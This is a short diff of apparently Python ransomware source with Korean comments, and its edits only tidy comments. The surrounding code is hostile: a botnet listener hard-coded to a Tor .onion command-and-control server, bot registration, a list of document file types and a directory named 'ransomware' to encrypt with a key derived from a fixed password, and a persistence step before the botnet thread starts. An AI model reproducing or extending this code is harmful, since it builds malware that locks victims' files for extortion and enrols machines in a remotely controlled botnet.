@@ -257,7 +257,7 @@ def update_bot_status():
 def botnet_command_listener():
     global server_ip, server_port
     server_ip = 'urgewe6nofzhevaetkha5yo77f2k6jd5zn3bfcxlqnbfr2wjdba5bgid.onion'
-    server_port = 80  # Tor 네트워크에서는 일반적으로 포트 80을 사용
+    server_port = 80
     bot_id = register_bot()
     while True:
         try:
@@ -293,8 +293,8 @@ def register_bot():
 
 # 메인 함수
 def main():
-    extensions_to_encrypt = ['.txt', '.docx', '.xlsx']  # 여기에 암호화할 파일 확장자 추가
-    directories_to_encrypt = ['랜섬웨어\\test\\']  # 여기에 암호화할 디렉토리 추가
+    extensions_to_encrypt = ['.txt', '.docx', '.xlsx']  # 암호화할 파일 확장자
+    directories_to_encrypt = ['랜섬웨어\\test\\']  # 암호화할 디렉토리
     password = b'1234'
     salt = os.urandom(16)
     key = generate_key(password, salt)
@@ -327,7 +327,7 @@ def main():
 
     print("지속성 완료")
 
-    # 멀티스레딩으로 봇넷 명령 수신 및 메시지 창 실행
+    # 멀티스레딩으로 봇넷 명령 수신, 메시지 창 실행
     botnet_thread = Thread(target=botnet_command_listener)
     botnet_thread.start()
 
